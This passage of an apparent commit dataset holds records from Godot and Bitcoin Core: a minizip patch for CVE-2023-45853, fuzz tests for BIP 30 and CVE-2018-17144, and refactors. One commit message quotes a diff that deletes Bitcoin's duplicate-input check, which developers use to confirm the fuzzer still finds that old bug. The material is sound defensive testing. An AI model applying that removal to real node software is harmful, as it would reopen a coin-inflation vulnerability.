    Minizip includes previously backported fix for CVE-2023-45853,

    and a Debian patch for CVE-2014-9485 was also upstreamed.'
  commit_sha: 8ead8d2ddb4bef0f667e208b7f4532a75ba494f7
  repo_name: godotengine/godot
- commit_diff:
  - "--- a/thirdparty/minizip/zip.c\n+++ b/thirdparty/minizip/zip.c\n@@ -1045,6 +1045,17\
    \ @@ extern int ZEXPORT zipOpenNewFileInZip4_64(zipFile file, const char* filename,\
    \ c\n       return ZIP_PARAMERROR;\n #endif\n \n+    // The filename and comment\
    \ length must fit in 16 bits.\n+    if ((filename!=NULL) && (strlen(filename)>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+    if ((comment!=NULL) && (strlen(comment)>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+    // The extra field length must fit in 16\
    \ bits. If the member also requires\n+    // a Zip64 extra block, that will also\
    \ need to fit within that 16-bit\n+    // length, but that will be checked for\
    \ later.\n+    if ((size_extrafield_local>0xffff) || (size_extrafield_global>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+\n     zi = (zip64_internal*)file;\n \n    \
    \ if (zi->in_opened_file_inzip == 1)"
  commit_message: 'Merge pull request #85509 from akien-mga/minizip-fix-CVE-2023-45853


    minizip: Backport patch to fix CVE-2023-45853'
  commit_sha: 3c8efca57dd3bc194f3ae645a262ba9e3b2fd7be
  repo_name: godotengine/godot
- commit_diff:
  - "--- a/thirdparty/minizip/zip.c\n+++ b/thirdparty/minizip/zip.c\n@@ -1045,6 +1045,17\
    \ @@ extern int ZEXPORT zipOpenNewFileInZip4_64(zipFile file, const char* filename,\
    \ c\n       return ZIP_PARAMERROR;\n #endif\n \n+    // The filename and comment\
    \ length must fit in 16 bits.\n+    if ((filename!=NULL) && (strlen(filename)>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+    if ((comment!=NULL) && (strlen(comment)>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+    // The extra field length must fit in 16\
    \ bits. If the member also requires\n+    // a Zip64 extra block, that will also\
    \ need to fit within that 16-bit\n+    // length, but that will be checked for\
    \ later.\n+    if ((size_extrafield_local>0xffff) || (size_extrafield_global>0xffff))\n\
    +        return ZIP_PARAMERROR;\n+\n     zi = (zip64_internal*)file;\n \n    \
    \ if (zi->in_opened_file_inzip == 1)"
  commit_message: 'minizip: Backport patch to fix CVE-2023-45853'
  commit_sha: c8dee05bf09cefdc33941aec1a76d3c563899995
  repo_name: godotengine/godot
- commit_diff:
  - "--- a/src/test/fuzz/utxo_total_supply.cpp\n+++ b/src/test/fuzz/utxo_total_supply.cpp\n\
    @@ -119,7 +119,9 @@ FUZZ_TARGET(utxo_total_supply)\n     current_block = PrepareNextBlock();\n\
    \     StoreLastTxo();\n \n-    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(),\
    \ 100'000)\n+    // Limit to avoid timeout, but enough to cover duplicate_coinbase_height\n\
    +    // and CVE-2018-17144.\n+    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(),\
    \ 2'000)\n     {\n         CallOneOf(\n             fuzzed_data_provider,"
  commit_message: "Merge bitcoin/bitcoin#27780: fuzz: Avoid timeout in utxo_total_supply\n\
    \nfafb4da121b19ba1b7bd173e25651c64d1982fb4 fuzz: Avoid timeout in utxo_total_supply\
    \ (MarcoFalke)\n\nPull request description:\n\n  Looks like for high block counts\
    \ it may be better to mock the chain, otherwise a high limit will lead to fuzz\
    \ input bloat and timeouts, see https://github.com/bitcoin/bitcoin/pull/17860#issuecomment-1538252773.\n\
    \n  It can be checked that the fuzz target can still find the CVE, see https://github.com/bitcoin/bitcoin/pull/17860#pullrequestreview-1410594057\
    \ with a diff of:\n\n  ```diff\n  diff --git a/src/consensus/tx_check.cpp b/src/consensus/tx_check.cpp\n\
    \  index f949655909..6f4cfb5f51 100644\n  --- a/src/consensus/tx_check.cpp\n \
    \ +++ b/src/consensus/tx_check.cpp\n  @@ -39,8 +39,6 @@ bool CheckTransaction(const\
    \ CTransaction& tx, TxValidationState& state)\n       // the underlying coins\
    \ database.\n       std::set<COutPoint> vInOutPoints;\n       for (const auto&\
    \ txin : tx.vin) {\n  -        if (!vInOutPoints.insert(txin.prevout).second)\n\
    \  -            return state.Invalid(TxValidationResult::TX_CONSENSUS, \"bad-txns-inputs-duplicate\"\
    );\n       }\n\n       if (tx.IsCoinBase())\n  ```\n\n  Also, fix a nit, see https://github.com/bitcoin/bitcoin/pull/17860#discussion_r1186451948\n\
    \nACKs for top commit:\n  dergoegge:\n    ACK fafb4da121b19ba1b7bd173e25651c64d1982fb4\n\
    \nTree-SHA512: a28fe9cd6ebb4c9bed5a5b35be76c1c436a87586c8fc3b3c4c8559a4a77ac08098324370da421d794c99579882c0872b6b29415de47ade6a05a08504a3d494c4"
  commit_sha: 2a786ea3493c9c2c628137806271f77e62fbee05
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/src/bench/block_assemble.cpp\n+++ b/src/bench/block_assemble.cpp\n@@ -27,7\
    \ +27,7 @@ static void AssembleBlock(benchmark::Bench& bench)\n     std::array<CTransactionRef,\
    \ NUM_BLOCKS - COINBASE_MATURITY + 1> txs;\n     for (size_t b{0}; b < NUM_BLOCKS;\
    \ ++b) {\n         CMutableTransaction tx;\n-        tx.vin.push_back(MineBlock(test_setup->m_node,\
    \ P2WSH_OP_TRUE));\n+        tx.vin.push_back(CTxIn{MineBlock(test_setup->m_node,\
    \ P2WSH_OP_TRUE)});\n         tx.vin.back().scriptWitness = witness;\n       \
    \  tx.vout.emplace_back(1337, P2WSH_OP_TRUE);\n         if (NUM_BLOCKS - b >=\
    \ COINBASE_MATURITY)"
  - "--- a/src/kernel/coinstats.cpp\n+++ b/src/kernel/coinstats.cpp\n@@ -123,7 +123,7\
    \ @@ static bool ComputeUTXOStats(CCoinsView* view, CCoinsStats& stats, T hash_obj,\
    \ c\n     uint256 prevkey;\n     std::map<uint32_t, Coin> outputs;\n     while\
    \ (pcursor->Valid()) {\n-        interruption_point();\n+        if (interruption_point)\
    \ interruption_point();\n         COutPoint key;\n         Coin coin;\n      \
    \   if (pcursor->GetKey(key) && pcursor->GetValue(coin)) {"
  - "--- a/src/test/fuzz/tx_pool.cpp\n+++ b/src/test/fuzz/tx_pool.cpp\n@@ -42,12 +42,12\
    \ @@ void initialize_tx_pool()\n     g_setup = testing_setup.get();\n \n     for\
    \ (int i = 0; i < 2 * COINBASE_MATURITY; ++i) {\n-        CTxIn in = MineBlock(g_setup->m_node,\
    \ P2WSH_OP_TRUE);\n+        COutPoint prevout{MineBlock(g_setup->m_node, P2WSH_OP_TRUE)};\n\
    \         // Remember the txids to avoid expensive disk access later on\n    \
    \     auto& outpoints = i < COINBASE_MATURITY ?\n                            \
    \   g_outpoints_coinbase_init_mature :\n                               g_outpoints_coinbase_init_immature;\n\
    -        outpoints.push_back(in.prevout);\n+        outpoints.push_back(prevout);\n\
    \     }\n     SyncWithValidationInterfaceQueue();\n }"
  - '--- a/src/test/fuzz/utxo_total_supply.cpp

    +++ b/src/test/fuzz/utxo_total_supply.cpp

    @@ -0,0 +1,165 @@

    +// Copyright (c) 2020 The Bitcoin Core developers

    +// Distributed under the MIT software license, see the accompanying

    +// file COPYING or http://www.opensource.org/licenses/mit-license.php.

    +

    +#include <chainparams.h>

    +#include <consensus/consensus.h>

    +#include <consensus/merkle.h>

    +#include <kernel/coinstats.h>

    +#include <node/miner.h>

    +#include <script/interpreter.h>

    +#include <streams.h>

    +#include <test/fuzz/FuzzedDataProvider.h>

    +#include <test/fuzz/fuzz.h>

    +#include <test/fuzz/util.h>

    +#include <test/util/mining.h>

    +#include <test/util/setup_common.h>

    +#include <validation.h>

    +#include <version.h>

    +

    +FUZZ_TARGET(utxo_total_supply)

    +{

    +    /** The testing setup that creates a chainman only (no chainstate) */

    +    ChainTestingSetup test_setup{

    +        CBaseChainParams::REGTEST,

    +        {

    +            "-testactivationheight=bip34@2",

    +        },

    +    };

    +    // Create chainstate

    +    test_setup.LoadVerifyActivateChainstate();

    +    auto& node{test_setup.m_node};

    +    auto& chainman{*Assert(test_setup.m_node.chainman)};

    +    FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size());

    +

    +    const auto ActiveHeight = [&]() {

    +        LOCK(chainman.GetMutex());

    +        return chainman.ActiveHeight();

    +    };

    +    const auto PrepareNextBlock = [&]() {

    +        // Use OP_FALSE to avoid BIP30 check from hitting early

    +        auto block = PrepareBlock(node, CScript{} << OP_FALSE);

    +        // Replace OP_FALSE with OP_TRUE

    +        {

    +            CMutableTransaction tx{*block->vtx.back()};

    +            tx.vout.at(0).scriptPubKey = CScript{} << OP_TRUE;

    +            block->vtx.back() = MakeTransactionRef(tx);

    +        }

    +        return block;

    +    };

    +

    +    /** The block template this fuzzer is working on */

    +    auto current_block = PrepareNextBlock();

    +    /** Append-only set of tx outpoints, entries are not removed when spent */

    +    std::vector<std::pair<COutPoint, CTxOut>> txos;

    +    /** The utxo stats at the chain tip */

    +    kernel::CCoinsStats utxo_stats;

    +    /** The total amount of coins in the utxo set */

    +    CAmount circulation{0};

    +

    +

    +    // Store the tx out in the txo map

    +    const auto StoreLastTxo = [&]() {

    +        // get last tx

    +        const CTransaction& tx = *current_block->vtx.back();

    +        // get last out

    +        const uint32_t i = tx.vout.size() - 1;

    +        // store it

    +        txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        if (current_block->vtx.size() == 1 && tx.vout.at(i).scriptPubKey[0] ==
    OP_RETURN) {

    +            // also store coinbase

    +            const uint32_t i = tx.vout.size() - 2;

    +            txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        }

    +    };

    +    const auto AppendRandomTxo = [&](CMutableTransaction& tx) {

    +        const auto& txo = txos.at(fuzzed_data_provider.ConsumeIntegralInRange<size_t>(0,
    txos.size() - 1));

    +        tx.vin.emplace_back(txo.first);

    +        tx.vout.emplace_back(txo.second.nValue, txo.second.scriptPubKey); //
    "Forward" coin with no fee

    +    };

    +    const auto UpdateUtxoStats = [&]() {

    +        LOCK(chainman.GetMutex());

    +        chainman.ActiveChainstate().ForceFlushStateToDisk();

    +        utxo_stats = std::move(

    +            *Assert(kernel::ComputeUTXOStats(kernel::CoinStatsHashType::NONE,
    &chainman.ActiveChainstate().CoinsDB(), chainman.m_blockman, {})));

    +        // Check that miner can''t print more money than they are allowed to

    +        assert(circulation == utxo_stats.total_amount);

    +    };

    +

    +

    +    // Update internal state to chain tip

    +    StoreLastTxo();

    +    UpdateUtxoStats();

    +    assert(ActiveHeight() == 0);

    +    // Get at which height we duplicate the coinbase

    +    // Assuming that the fuzzer will mine relatively short chains (less than
    200 blocks), we want the duplicate coinbase to be not too high.

    +    // Up to 2000 seems reasonable.

    +    int64_t duplicate_coinbase_height = fuzzed_data_provider.ConsumeIntegralInRange(0,
    20 * COINBASE_MATURITY);

    +    // Always pad with OP_0 at the end to avoid bad-cb-length error

    +    const CScript duplicate_coinbase_script = CScript() << duplicate_coinbase_height
    << OP_0;

    +    // Mine the first block with this duplicate

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    {

    +        // Create duplicate (CScript should match exact format as in CreateNewBlock)

    +        CMutableTransaction tx{*current_block->vtx.front()};

    +        tx.vin.at(0).scriptSig = duplicate_coinbase_script;

    +

    +        // Mine block and create next block template

    +        current_block->vtx.front() = MakeTransactionRef(tx);

    +    }

    +    current_block->hashMerkleRoot = BlockMerkleRoot(*current_block);

    +    assert(!MineBlock(node, current_block).IsNull());

    +    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +    assert(ActiveHeight() == 1);

    +    UpdateUtxoStats();

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(), 100''000)

    +    {

    +        CallOneOf(

    +            fuzzed_data_provider,

    +            [&] {

    +                // Append an input-output pair to the last tx in the current
    block

    +                CMutableTransaction tx{*current_block->vtx.back()};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.back() = MakeTransactionRef(tx);

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append a tx to the list of txs in the current block

    +                CMutableTransaction tx{};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.push_back(MakeTransactionRef(tx));

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append the current block to the active chain

    +                node::RegenerateCommitments(*current_block, chainman);

    +                const bool was_valid = !MineBlock(node, current_block).IsNull();

    +

    +                const auto prev_utxo_stats = utxo_stats;

    +                if (was_valid) {

    +                    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +                    if (duplicate_coinbase_height == ActiveHeight()) {

    +                        // we mined the duplicate coinbase

    +                        assert(current_block->vtx.at(0)->vin.at(0).scriptSig
    == duplicate_coinbase_script);

    +                    }

    +                }

    +

    +                UpdateUtxoStats();

    +

    +                if (!was_valid) {

    +                    // utxo stats must not change

    +                    assert(prev_utxo_stats.hashSerialized == utxo_stats.hashSerialized);

    +                }

    +

    +                current_block = PrepareNextBlock();

    +                StoreLastTxo();

    +            });

    +    }

    +}'
  - "--- a/src/test/util/mining.cpp\n+++ b/src/test/util/mining.cpp\n@@ -6,19 +6,22\
    \ @@\n \n #include <chainparams.h>\n #include <consensus/merkle.h>\n+#include\
    \ <consensus/validation.h>\n #include <key_io.h>\n #include <node/context.h>\n\
    \ #include <pow.h>\n+#include <primitives/transaction.h>\n #include <script/standard.h>\n\
    \ #include <test/util/script.h>\n #include <util/check.h>\n #include <validation.h>\n\
    +#include <validationinterface.h>\n #include <versionbits.h>\n \n using node::BlockAssembler;\n\
    \ using node::NodeContext;\n \n-CTxIn generatetoaddress(const NodeContext& node,\
    \ const std::string& address)\n+COutPoint generatetoaddress(const NodeContext&\
    \ node, const std::string& address)\n {\n     const auto dest = DecodeDestination(address);\n\
    \     assert(IsValidDestination(dest));\n@@ -58,19 +61,52 @@ std::vector<std::shared_ptr<CBlock>>\
    \ CreateBlockChain(size_t total_height, const\n     return ret;\n }\n \n-CTxIn\
    \ MineBlock(const NodeContext& node, const CScript& coinbase_scriptPubKey)\n+COutPoint\
    \ MineBlock(const NodeContext& node, const CScript& coinbase_scriptPubKey)\n {\n\
    \     auto block = PrepareBlock(node, coinbase_scriptPubKey);\n+    auto valid\
    \ = MineBlock(node, block);\n+    assert(!valid.IsNull());\n+    return valid;\n\
    +}\n+\n+struct BlockValidationStateCatcher : public CValidationInterface {\n+\
    \    const uint256 m_hash;\n+    std::optional<BlockValidationState> m_state;\n\
    \ \n+    BlockValidationStateCatcher(const uint256& hash)\n+        : m_hash{hash},\n\
    +          m_state{} {}\n+\n+protected:\n+    void BlockChecked(const CBlock&\
    \ block, const BlockValidationState& state) override\n+    {\n+        if (block.GetHash()\
    \ != m_hash) return;\n+        m_state = state;\n+    }\n+};\n+\n+COutPoint MineBlock(const\
    \ NodeContext& node, std::shared_ptr<CBlock>& block)\n+{\n     while (!CheckProofOfWork(block->GetHash(),\
    \ block->nBits, Params().GetConsensus())) {\n         ++block->nNonce;\n     \
    \    assert(block->nNonce);\n     }\n \n-    bool processed{Assert(node.chainman)->ProcessNewBlock(block,\
    \ true, true, nullptr)};\n-    assert(processed);\n-\n-    return CTxIn{block->vtx[0]->GetHash(),\
    \ 0};\n+    auto& chainman{*Assert(node.chainman)};\n+    const auto old_height\
    \ = WITH_LOCK(chainman.GetMutex(), return chainman.ActiveHeight());\n+    bool\
    \ new_block;\n+    BlockValidationStateCatcher bvsc{block->GetHash()};\n+    RegisterValidationInterface(&bvsc);\n\
    +    const bool processed{chainman.ProcessNewBlock(block, true, true, &new_block)};\n\
    +    const bool duplicate{!new_block && processed};\n+    assert(!duplicate);\n\
    +    UnregisterValidationInterface(&bvsc);\n+    SyncWithValidationInterfaceQueue();\n\
    +    const bool was_valid{bvsc.m_state && bvsc.m_state->IsValid()};\n+    assert(old_height\
    \ + was_valid == WITH_LOCK(chainman.GetMutex(), return chainman.ActiveHeight()));\n\
    +\n+    if (was_valid) return {block->vtx[0]->GetHash(), 0};\n+    return {};\n\
    \ }\n \n std::shared_ptr<CBlock> PrepareBlock(const NodeContext& node, const CScript&\
    \ coinbase_scriptPubKey,"
  - "--- a/src/test/util/setup_common.cpp\n+++ b/src/test/util/setup_common.cpp\n\
    @@ -214,7 +214,7 @@ ChainTestingSetup::~ChainTestingSetup()\n     m_node.chainman.reset();\n\
    \ }\n \n-void TestingSetup::LoadVerifyActivateChainstate()\n+void ChainTestingSetup::LoadVerifyActivateChainstate()\n\
    \ {\n     auto& chainman{*Assert(m_node.chainman)};\n     node::ChainstateLoadOptions\
    \ options;\n@@ -244,10 +244,10 @@ TestingSetup::TestingSetup(\n     const std::vector<const\
    \ char*>& extra_args,\n     const bool coins_db_in_memory,\n     const bool block_tree_db_in_memory)\n\
    -    : ChainTestingSetup(chainName, extra_args),\n-      m_coins_db_in_memory(coins_db_in_memory),\n\
    -      m_block_tree_db_in_memory(block_tree_db_in_memory)\n+    : ChainTestingSetup(chainName,\
    \ extra_args)\n {\n+    m_coins_db_in_memory = coins_db_in_memory;\n+    m_block_tree_db_in_memory\
    \ = block_tree_db_in_memory;\n     // Ideally we'd move all the RPC tests to the\
    \ functional testing framework\n     // instead of unit tests, but for now we\
    \ need these here.\n     RegisterAllCoreRPCCommands(tableRPC);"
  commit_message: "Merge bitcoin/bitcoin#17860: fuzz: BIP 30, CVE-2018-17144\n\nfa2d8b61f9343d350b67357a12f39b613c8ee8ad\
    \ fuzz: BIP 42, BIP 30, CVE-2018-17144 (MarcoFalke)\nfaae7d5c00c99b0f3e99a1fbffbf369645716dd1\
    \ Move LoadVerifyActivateChainstate to ChainTestingSetup (MarcoFalke)\nfa26e3462a0fb1a9ad116ed58afa6897798f2c24\
    \ Avoid dereferencing interruption_point if it is nullptr (MarcoFalke)\nfa846ee074822160077f3f7476b2af62a876dec7\
    \ test: Add util to mine invalid blocks (MarcoFalke)\n\nPull request description:\n\
    \n  Add a validation fuzz test for BIP 30 and CVE-2018-17144\n\nACKs for top commit:\n\
    \  dergoegge:\n    Code review ACK fa2d8b61f9343d350b67357a12f39b613c8ee8ad\n\
    \  mzumsande:\n    Tested ACK fa2d8b61f9343d350b67357a12f39b613c8ee8ad\n\nTree-SHA512:\
    \ 1f4620cc078709487abff24b304a6bb4eeab2e7628b392e2bc6de9cc0ce6745c413388ede6e93025d0c56eec905607ba9786633ef183e5779bf5183cc9ff92c0"
  commit_sha: 322ec63b01499c1ec52d3912ee382ebd59f2366b
  repo_name: bitcoin/bitcoin
- commit_diff:
  - '--- a/src/test/fuzz/utxo_total_supply.cpp

    +++ b/src/test/fuzz/utxo_total_supply.cpp

    @@ -0,0 +1,165 @@

    +// Copyright (c) 2020 The Bitcoin Core developers

    +// Distributed under the MIT software license, see the accompanying

    +// file COPYING or http://www.opensource.org/licenses/mit-license.php.

    +

    +#include <chainparams.h>

    +#include <consensus/consensus.h>

    +#include <consensus/merkle.h>

    +#include <kernel/coinstats.h>

    +#include <node/miner.h>

    +#include <script/interpreter.h>

    +#include <streams.h>

    +#include <test/fuzz/FuzzedDataProvider.h>

    +#include <test/fuzz/fuzz.h>

    +#include <test/fuzz/util.h>

    +#include <test/util/mining.h>

    +#include <test/util/setup_common.h>

    +#include <validation.h>

    +#include <version.h>

    +

    +FUZZ_TARGET(utxo_total_supply)

    +{

    +    /** The testing setup that creates a chainman only (no chainstate) */

    +    ChainTestingSetup test_setup{

    +        CBaseChainParams::REGTEST,

    +        {

    +            "-testactivationheight=bip34@2",

    +        },

    +    };

    +    // Create chainstate

    +    test_setup.LoadVerifyActivateChainstate();

    +    auto& node{test_setup.m_node};

    +    auto& chainman{*Assert(test_setup.m_node.chainman)};

    +    FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size());

    +

    +    const auto ActiveHeight = [&]() {

    +        LOCK(chainman.GetMutex());

    +        return chainman.ActiveHeight();

    +    };

    +    const auto PrepareNextBlock = [&]() {

    +        // Use OP_FALSE to avoid BIP30 check from hitting early

    +        auto block = PrepareBlock(node, CScript{} << OP_FALSE);

    +        // Replace OP_FALSE with OP_TRUE

    +        {

    +            CMutableTransaction tx{*block->vtx.back()};

    +            tx.vout.at(0).scriptPubKey = CScript{} << OP_TRUE;

    +            block->vtx.back() = MakeTransactionRef(tx);

    +        }

    +        return block;

    +    };

    +

    +    /** The block template this fuzzer is working on */

    +    auto current_block = PrepareNextBlock();

    +    /** Append-only set of tx outpoints, entries are not removed when spent */

    +    std::vector<std::pair<COutPoint, CTxOut>> txos;

    +    /** The utxo stats at the chain tip */

    +    kernel::CCoinsStats utxo_stats;

    +    /** The total amount of coins in the utxo set */

    +    CAmount circulation{0};

    +

    +

    +    // Store the tx out in the txo map

    +    const auto StoreLastTxo = [&]() {

    +        // get last tx

    +        const CTransaction& tx = *current_block->vtx.back();

    +        // get last out

    +        const uint32_t i = tx.vout.size() - 1;

    +        // store it

    +        txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        if (current_block->vtx.size() == 1 && tx.vout.at(i).scriptPubKey[0] ==
    OP_RETURN) {

    +            // also store coinbase

    +            const uint32_t i = tx.vout.size() - 2;

    +            txos.emplace_back(COutPoint{tx.GetHash(), i}, tx.vout.at(i));

    +        }

    +    };

    +    const auto AppendRandomTxo = [&](CMutableTransaction& tx) {

    +        const auto& txo = txos.at(fuzzed_data_provider.ConsumeIntegralInRange<size_t>(0,
    txos.size() - 1));

    +        tx.vin.emplace_back(txo.first);

    +        tx.vout.emplace_back(txo.second.nValue, txo.second.scriptPubKey); //
    "Forward" coin with no fee

    +    };

    +    const auto UpdateUtxoStats = [&]() {

    +        LOCK(chainman.GetMutex());

    +        chainman.ActiveChainstate().ForceFlushStateToDisk();

    +        utxo_stats = std::move(

    +            *Assert(kernel::ComputeUTXOStats(kernel::CoinStatsHashType::NONE,
    &chainman.ActiveChainstate().CoinsDB(), chainman.m_blockman, {})));

    +        // Check that miner can''t print more money than they are allowed to

    +        assert(circulation == utxo_stats.total_amount);

    +    };

    +

    +

    +    // Update internal state to chain tip

    +    StoreLastTxo();

    +    UpdateUtxoStats();

    +    assert(ActiveHeight() == 0);

    +    // Get at which height we duplicate the coinbase

    +    // Assuming that the fuzzer will mine relatively short chains (less than
    200 blocks), we want the duplicate coinbase to be not too high.

    +    // Up to 2000 seems reasonable.

    +    int64_t duplicate_coinbase_height = fuzzed_data_provider.ConsumeIntegralInRange(0,
    20 * COINBASE_MATURITY);

    +    // Always pad with OP_0 at the end to avoid bad-cb-length error

    +    const CScript duplicate_coinbase_script = CScript() << duplicate_coinbase_height
    << OP_0;

    +    // Mine the first block with this duplicate

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    {

    +        // Create duplicate (CScript should match exact format as in CreateNewBlock)

    +        CMutableTransaction tx{*current_block->vtx.front()};

    +        tx.vin.at(0).scriptSig = duplicate_coinbase_script;

    +

    +        // Mine block and create next block template

    +        current_block->vtx.front() = MakeTransactionRef(tx);

    +    }

    +    current_block->hashMerkleRoot = BlockMerkleRoot(*current_block);

    +    assert(!MineBlock(node, current_block).IsNull());

    +    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +    assert(ActiveHeight() == 1);

    +    UpdateUtxoStats();

    +    current_block = PrepareNextBlock();

    +    StoreLastTxo();

    +

    +    LIMITED_WHILE(fuzzed_data_provider.remaining_bytes(), 100''000)

    +    {

    +        CallOneOf(

    +            fuzzed_data_provider,

    +            [&] {

    +                // Append an input-output pair to the last tx in the current
    block

    +                CMutableTransaction tx{*current_block->vtx.back()};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.back() = MakeTransactionRef(tx);

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append a tx to the list of txs in the current block

    +                CMutableTransaction tx{};

    +                AppendRandomTxo(tx);

    +                current_block->vtx.push_back(MakeTransactionRef(tx));

    +                StoreLastTxo();

    +            },

    +            [&] {

    +                // Append the current block to the active chain

    +                node::RegenerateCommitments(*current_block, chainman);

    +                const bool was_valid = !MineBlock(node, current_block).IsNull();

    +

    +                const auto prev_utxo_stats = utxo_stats;

    +                if (was_valid) {

    +                    circulation += GetBlockSubsidy(ActiveHeight(), Params().GetConsensus());

    +

    +                    if (duplicate_coinbase_height == ActiveHeight()) {

    +                        // we mined the duplicate coinbase

    +                        assert(current_block->vtx.at(0)->vin.at(0).scriptSig
    == duplicate_coinbase_script);

    +                    }

    +                }

    +

    +                UpdateUtxoStats();

    +

    +                if (!was_valid) {

    +                    // utxo stats must not change

    +                    assert(prev_utxo_stats.hashSerialized == utxo_stats.hashSerialized);

    +                }

    +

    +                current_block = PrepareNextBlock();

    +                StoreLastTxo();

    +            });

    +    }

    +}'
  commit_message: 'fuzz: BIP 42, BIP 30, CVE-2018-17144'
  commit_sha: fa2d8b61f9343d350b67357a12f39b613c8ee8ad
  repo_name: bitcoin/bitcoin
- commit_diff:
  - "--- a/src/init.cpp\n+++ b/src/init.cpp\n@@ -560,7 +560,7 @@ void SetupServerArgs(ArgsManager&\
    \ argsman)\n     SetupChainParamsBaseOptions(argsman);\n \n     argsman.AddArg(\"\
    -acceptnonstdtxn\", strprintf(\"Relay and mine \\\"non-standard\\\" transactions\
    \ (%sdefault: %u)\", \"testnet/regtest only; \", !testnetChainParams->RequireStandard()),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    -    argsman.AddArg(\"-incrementalrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define cost of relay, used for mempool limiting and BIP 125 replacement.\
    \ (default: %s)\", CURRENCY_UNIT, FormatMoney(DEFAULT_INCREMENTAL_RELAY_FEE)),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    +    argsman.AddArg(\"-incrementalrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define cost of relay, used for mempool limiting and replacement policy.\
    \ (default: %s)\", CURRENCY_UNIT, FormatMoney(DEFAULT_INCREMENTAL_RELAY_FEE)),\
    \ ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY, OptionsCategory::NODE_RELAY);\n\
    \     argsman.AddArg(\"-dustrelayfee=<amt>\", strprintf(\"Fee rate (in %s/kvB)\
    \ used to define dust, the value of an output such that it will cost more than\
    \ its value in fees at this fee rate to spend it. (default: %s)\", CURRENCY_UNIT,\
    \ FormatMoney(DUST_RELAY_TX_FEE)), ArgsManager::ALLOW_ANY | ArgsManager::DEBUG_ONLY,\
    \ OptionsCategory::NODE_RELAY);\n     argsman.AddArg(\"-bytespersigop\", strprintf(\"\
    Equivalent bytes per sigop in transactions for relay and mining (default: %u)\"\
    , DEFAULT_BYTES_PER_SIGOP), ArgsManager::ALLOW_ANY, OptionsCategory::NODE_RELAY);\n\
    \     argsman.AddArg(\"-datacarrier\", strprintf(\"Relay and mine data carrier\
    \ transactions (default: %u)\", DEFAULT_ACCEPT_DATACARRIER), ArgsManager::ALLOW_ANY,\
    \ OptionsCategory::NODE_RELAY);"
  - "--- a/src/node/mempool_args.cpp\n+++ b/src/node/mempool_args.cpp\n@@ -45,7 +45,7\
    \ @@ std::optional<bilingual_str> ApplyArgsManOptions(const ArgsManager& argsman,\
    \ con\n \n     if (auto hours = argsman.GetIntArg(\"-mempoolexpiry\")) mempool_opts.expiry\
    \ = std::chrono::hours{*hours};\n \n-    // incremental relay fee sets the minimum\
    \ feerate increase necessary for BIP 125 replacement in the mempool\n+    // incremental\
    \ relay fee sets the minimum feerate increase necessary for replacement in the\
    \ mempool\n     // and the amount the mempool min fee increases above the feerate\
    \ of txs evicted due to mempool limiting.\n     if (argsman.IsArgSet(\"-incrementalrelayfee\"\
    )) {\n         if (std::optional<CAmount> inc_relay_fee = ParseMoney(argsman.GetArg(\"\
    -incrementalrelayfee\", \"\"))) {"
  - "--- a/src/policy/rbf.cpp\n+++ b/src/policy/rbf.cpp\n@@ -65,15 +65,15 @@ std::optional<std::string>\
    \ GetEntriesForConflicts(const CTransaction& tx,\n     uint64_t nConflictingCount\
    \ = 0;\n     for (const auto& mi : iters_conflicting) {\n         nConflictingCount\
    \ += mi->GetCountWithDescendants();\n-        // BIP125 Rule #5: don't consider\
    \ replacing more than MAX_BIP125_REPLACEMENT_CANDIDATES\n+        // Rule #5:\
    \ don't consider replacing more than MAX_REPLACEMENT_CANDIDATES\n         // entries\
    \ from the mempool. This potentially overestimates the number of actual\n    \
    \     // descendants (i.e. if multiple conflicts share a descendant, it will be\
    \ counted multiple\n         // times), but we just want to be conservative to\
    \ avoid doing too much work.\n-        if (nConflictingCount > MAX_BIP125_REPLACEMENT_CANDIDATES)\
    \ {\n+        if (nConflictingCount > MAX_REPLACEMENT_CANDIDATES) {\n        \
    \     return strprintf(\"rejecting replacement %s; too many potential replacements\
    \ (%d > %d)\\n\",\n                              txid.ToString(),\n          \
    \                    nConflictingCount,\n-                             MAX_BIP125_REPLACEMENT_CANDIDATES);\n\
    +                             MAX_REPLACEMENT_CANDIDATES);\n         }\n     }\n\
    \     // Calculate the set of all transactions that would have to be evicted.\n\
    @@ -96,7 +96,7 @@ std::optional<std::string> HasNoNewUnconfirmed(const CTransaction&\
    \ tx,\n     }\n \n     for (unsigned int j = 0; j < tx.vin.size(); j++) {\n- \
    \       // BIP125 Rule #2: We don't want to accept replacements that require low\
    \ feerate junk to be\n+        // Rule #2: We don't want to accept replacements\
    \ that require low feerate junk to be\n         // mined first.  Ideally we'd\
    \ keep track of the ancestor feerates and make the decision\n         // based\
